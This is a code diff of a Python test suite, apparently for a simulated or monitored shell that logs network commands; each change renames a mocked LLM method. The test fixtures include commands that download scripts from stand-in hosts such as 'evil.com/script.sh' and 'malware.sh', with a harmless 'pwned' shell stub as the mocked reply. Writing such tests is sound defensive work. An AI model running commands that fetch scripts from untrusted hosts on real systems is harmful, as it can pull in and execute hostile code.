@@ -29,7 +29,7 @@ class TestNetworkIntelligence(unittest.TestCase):
             os.remove(self.test_db_path)
 
     def test_curl_url_logging(self):
-        self.mock_llm.generate_response.return_value = "<html>Mock Content</html>"
+        self.mock_llm.generate_content.return_value = "<html>Mock Content</html>"
         
         url = "http://example.com/malware.sh"
         cmd = f"curl {url}"
@@ -49,7 +49,7 @@ class TestNetworkIntelligence(unittest.TestCase):
         self.assertIn("curl", row[2])
 
     def test_wget_save_file(self):
-        self.mock_llm.generate_response.return_value = "#!/bin/bash\necho pwned"
+        self.mock_llm.generate_content.return_value = "#!/bin/bash\necho pwned"
         
         url = "http://evil.com/script.sh"
         cmd = f"wget -O custom_script.sh {url}"
@@ -63,7 +63,7 @@ class TestNetworkIntelligence(unittest.TestCase):
         self.assertIn("saved", output)
 
     def test_curl_head_request(self):
-        self.mock_llm.generate_response.return_value = "HTTP/1.1 200 OK\nServer: Fake"
+        self.mock_llm.generate_content.return_value = "HTTP/1.1 200 OK\nServer: Fake"
         
         url = "http://google.com"
         cmd = f"curl -I {url}"
